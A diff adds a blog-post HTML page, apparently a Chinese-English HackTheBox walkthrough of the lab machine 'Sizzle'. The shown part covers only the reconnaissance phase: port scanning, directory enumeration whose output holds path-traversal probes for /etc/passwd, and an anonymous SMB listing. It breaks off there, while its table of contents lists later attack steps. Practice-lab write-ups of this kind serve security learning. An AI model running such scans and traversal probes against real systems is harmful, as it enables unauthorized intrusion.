@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before allInsane 好難打 qwq最後被扁到看 write upVictim’s IP : 10.10.10.103Attacker’s IP : 10.10.14.14   RECONport scanCommand   1rustscan -a 10.10.10.103 --ulimit 5000 -- -sC -sV -Pn Result   12345678910111213">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sizzle on HackTheBox">
+<meta property="og:url" content="http://wha13.github.io/2024/12/29/htb-sizzle/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before allInsane 好難打 qwq最後被扁到看 write upVictim’s IP : 10.10.10.103Attacker’s IP : 10.10.14.14   RECONport scanCommand   1rustscan -a 10.10.10.103 --ulimit 5000 -- -sC -sV -Pn Result   12345678910111213">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkc4Q5RBJx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByRMrc0Hkl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkrD45RrJl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJCwEcArJx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1QoRsAryg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1CYmJk8Jg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryUhNyyUJg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkynLk1Ukx.png">
+<meta property="article:published_time" content="2024-12-30T03:11:05.000Z">
+<meta property="article:modified_time" content="2024-12-29T15:13:54.322Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="Pentesting">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="AD">
+<meta property="article:tag" content="Active Directory">
+<meta property="article:tag" content="smb">
+<meta property="article:tag" content="certsrv">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/rkc4Q5RBJx.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Sizzle on HackTheBox</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/27/htb-resolute/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/12/29/htb-sizzle/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/12/29/htb-sizzle/&text=Sizzle on HackTheBox"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/12/29/htb-sizzle/&title=Sizzle on HackTheBox"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/12/29/htb-sizzle/&is_video=false&description=Sizzle on HackTheBox"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sizzle on HackTheBox&body=Check out this article: http://wha13.github.io/2024/12/29/htb-sizzle/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/12/29/htb-sizzle/&title=Sizzle on HackTheBox"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/12/29/htb-sizzle/&title=Sizzle on HackTheBox"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/12/29/htb-sizzle/&title=Sizzle on HackTheBox"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/12/29/htb-sizzle/&title=Sizzle on HackTheBox"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/12/29/htb-sizzle/&name=Sizzle on HackTheBox&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/12/29/htb-sizzle/&t=Sizzle on HackTheBox"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">2.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">2.1.</span> <span class="toc-text">port scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#directory-enumeration"><span class="toc-number">2.2.</span> <span class="toc-text">directory enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#scf-file-attack"><span class="toc-number">3.1.</span> <span class="toc-text">scf file attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apply-new-cert"><span class="toc-number">3.2.</span> <span class="toc-text">Apply new cert</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberoasting-with-Rebeus"><span class="toc-number">4.1.</span> <span class="toc-text">kerberoasting with Rebeus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCSync"><span class="toc-number">4.2.</span> <span class="toc-text">DCSync</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">5.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Sizzle on HackTheBox
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-30T03:11:05.000Z" class="dt-published" itemprop="datePublished">2024-12-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AD/" rel="tag">AD</a>, <a class="p-category" href="/tags/Active-Directory/" rel="tag">Active Directory</a>, <a class="p-category" href="/tags/HackTheBox/" rel="tag">HackTheBox</a>, <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>, <a class="p-category" href="/tags/certsrv/" rel="tag">certsrv</a>, <a class="p-category" href="/tags/smb/" rel="tag">smb</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Insane 好難打 qwq<br>最後被扁到看 write up<br>Victim’s IP : 10.10.10.103<br>Attacker’s IP : 10.10.14.14  </p>
+<h2 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h2><h3 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h3><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rustscan -a 10.10.10.103 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2024-12-29T02:58:52+00:00; +1s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=sizzle.htb.local</span><br><span class="line">| Issuer: commonName=HTB-SIZZLE-CA/domainComponent=HTB</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2018-07-03T17:58:55</span><br><span class="line">| Not valid after:  2020-07-02T17:58:55</span><br><span class="line">| MD5:   240b:1eff:5a65:ad8d:c64d:855e:aeb5:9e6b</span><br><span class="line">| SHA-1: 77bb:3f67:1b6b:3e09:b8f9:6503:ddc1:0bbf:0b75:0c72</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIFPTCCBCWgAwIBAgITaQAAAAXvru32D6T3IQAAAAAABTANBgkqhkiG9w0BAQsF</span><br><span class="line">| ... a lot of stuffs</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">| ssl-cert: Subject: commonName=sizzle.htb.local</span><br><span class="line">| Issuer: commonName=HTB-SIZZLE-CA/domainComponent=HTB</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2018-07-03T17:58:55</span><br><span class="line">| Not valid after:  2020-07-02T17:58:55</span><br><span class="line">| MD5:   240b:1eff:5a65:ad8d:c64d:855e:aeb5:9e6b</span><br><span class="line">| SHA-1: 77bb:3f67:1b6b:3e09:b8f9:6503:ddc1:0bbf:0b75:0c72</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIFPTCCBCWgAwIBAgITaQAAAAXvru32D6T3IQAAAAAABTANBgkqhkiG9w0BAQsF</span><br><span class="line">| ... a lot of stuffs</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">| tls-alpn: </span><br><span class="line">|   h2</span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_ssl-date: 2024-12-29T02:58:51+00:00; 0s from scanner time.</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2024-12-29T02:58:51+00:00; 0s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=sizzle.htb.local</span><br><span class="line">| Issuer: commonName=HTB-SIZZLE-CA/domainComponent=HTB</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2018-07-03T17:58:55</span><br><span class="line">| Not valid after:  2020-07-02T17:58:55</span><br><span class="line">| MD5:   240b:1eff:5a65:ad8d:c64d:855e:aeb5:9e6b</span><br><span class="line">| SHA-1: 77bb:3f67:1b6b:3e09:b8f9:6503:ddc1:0bbf:0b75:0c72</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIFPTCCBCWgAwIBAgITaQAAAAXvru32D6T3IQAAAAAABTANBgkqhkiG9w0BAQsF</span><br><span class="line">| ... a lot of stuffs</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2024-12-29T02:58:52+00:00; +1s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=sizzle.htb.local</span><br><span class="line">| Issuer: commonName=HTB-SIZZLE-CA/domainComponent=HTB</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2018-07-03T17:58:55</span><br><span class="line">| Not valid after:  2020-07-02T17:58:55</span><br><span class="line">| MD5:   240b:1eff:5a65:ad8d:c64d:855e:aeb5:9e6b</span><br><span class="line">| SHA-1: 77bb:3f67:1b6b:3e09:b8f9:6503:ddc1:0bbf:0b75:0c72</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIFPTCCBCWgAwIBAgITaQAAAAXvru32D6T3IQAAAAAABTANBgkqhkiG9w0BAQsF</span><br><span class="line">| ... a lot of stuffs </span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2024-12-29T02:58:51+00:00; 0s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=sizzle.htb.local</span><br><span class="line">| Issuer: commonName=HTB-SIZZLE-CA/domainComponent=HTB</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2018-07-03T17:58:55</span><br><span class="line">| Not valid after:  2020-07-02T17:58:55</span><br><span class="line">| MD5:   240b:1eff:5a65:ad8d:c64d:855e:aeb5:9e6b</span><br><span class="line">| SHA-1: 77bb:3f67:1b6b:3e09:b8f9:6503:ddc1:0bbf:0b75:0c72</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIFPTCCBCWgAwIBAgITaQAAAAXvru32D6T3IQAAAAAABTANBgkqhkiG9w0BAQsF</span><br><span class="line">| ... a lot of stuffs</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49690/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49691/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49708/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">58437/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">58456/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure>
+<p>一台有開 smb, ldap, msrpc 和一個神奇 port 80 的 Windows 主機<br>獲得域名 <code>HTB.LOCAL</code> 及 <code>sizzle</code>，值得注意的是沒有開 kerberos  </p>
+<h3 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h3><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch --url <span class="string">&#x27;http://10.10.10.103&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[04:09:12] Starting:                                                                                </span><br><span class="line">[04:09:15] 403 -  312B  - /%2e%2e//google.com                               </span><br><span class="line">[04:09:15] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             </span><br><span class="line">[04:09:15] 404 -    2KB - /.ashx                                            </span><br><span class="line">[04:09:15] 404 -    2KB - /.asmx                                            </span><br><span class="line">[04:09:29] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           </span><br><span class="line">[04:09:34] 404 -    2KB - /admin%20/                                        </span><br><span class="line">[04:09:35] 404 -    2KB - /admin.                                           </span><br><span class="line">[04:09:49] 301 -  157B  - /aspnet_client  -&gt;  http://10.10.10.103/aspnet_client/</span><br><span class="line">[04:09:49] 403 -    1KB - /aspnet_client/</span><br><span class="line">[04:09:49] 404 -    2KB - /asset..                                          </span><br><span class="line">[04:09:54] 403 -    1KB - /certenroll/                                      </span><br><span class="line">[04:09:54] 401 -    1KB - /certsrv/                                         </span><br><span class="line">[04:09:54] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     </span><br><span class="line">[04:10:02] 400 -    3KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console</span><br><span class="line">[04:10:11] 403 -    1KB - /images/                                          </span><br><span class="line">[04:10:11] 301 -  150B  - /images  -&gt;  http://10.10.10.103/images/</span><br><span class="line">[04:10:12] 404 -    2KB - /index.php.                                       </span><br><span class="line">[04:10:14] 404 -    2KB - /javax.faces.resource.../                         </span><br><span class="line">[04:10:14] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd                                                                                   </span><br><span class="line">[04:10:14] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd                                                                                          </span><br><span class="line">[04:10:14] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*</span><br><span class="line">[04:10:14] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo                                                                                          </span><br><span class="line">[04:10:14] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable</span><br><span class="line">[04:10:14] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned                                                                                             </span><br><span class="line">[04:10:14] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties</span><br><span class="line">[04:10:14] 400 -    3KB - /jolokia/exec/java.lang:type=Memory/gc</span><br><span class="line">[04:10:14] 400 -    3KB - /jolokia/read/java.lang:type=*/HeapMemoryUsage    </span><br><span class="line">[04:10:14] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used</span><br><span class="line">[04:10:14] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*           </span><br><span class="line">[04:10:14] 400 -    3KB - /jolokia/write/java.lang:type=Memory/Verbose/true</span><br><span class="line">[04:10:17] 404 -    2KB - /login.wdm%2e                                     </span><br><span class="line">[04:10:19] 404 -    2KB - /mcx/mcxservice.svc                               </span><br><span class="line">[04:10:32] 404 -    2KB - /rating_over.                                     </span><br><span class="line">[04:10:32] 404 -    2KB - /reach/sip.svc                                    </span><br><span class="line">[04:10:36] 404 -    2KB - /service.asmx                                     </span><br><span class="line">[04:10:41] 404 -    2KB - /static..                                         </span><br><span class="line">[04:10:47] 403 -    2KB - /Trace.axd                                        </span><br><span class="line">[04:10:47] 404 -    2KB - /umbraco/webservices/codeEditorSave.asmx          </span><br><span class="line">[04:10:51] 404 -    2KB - /WEB-INF./                                        </span><br><span class="line">[04:10:53] 404 -    2KB - /WebResource.axd?d=LER8t9aS                       </span><br><span class="line">[04:10:53] 404 -    2KB - /webticket/webticketservice.svc</span><br></pre></td></tr></table></figure>
+<p>注意到一個需要 http-auth 的路徑 certsrc，查一下發現是 AD 的憑證服務：<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows-server/identity/ad-cs/certificate-authority-web-enrollment">https://learn.microsoft.com/zh-tw/windows-server/identity/ad-cs/certificate-authority-web-enrollment</a>  </p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="scf-file-attack"><a href="#scf-file-attack" class="headerlink" title="scf file attack"></a>scf file attack</h3><p>smb 允許 guest 無密碼認證，先列舉一下吧 :D<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.10.103/ -N</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong>  </p>
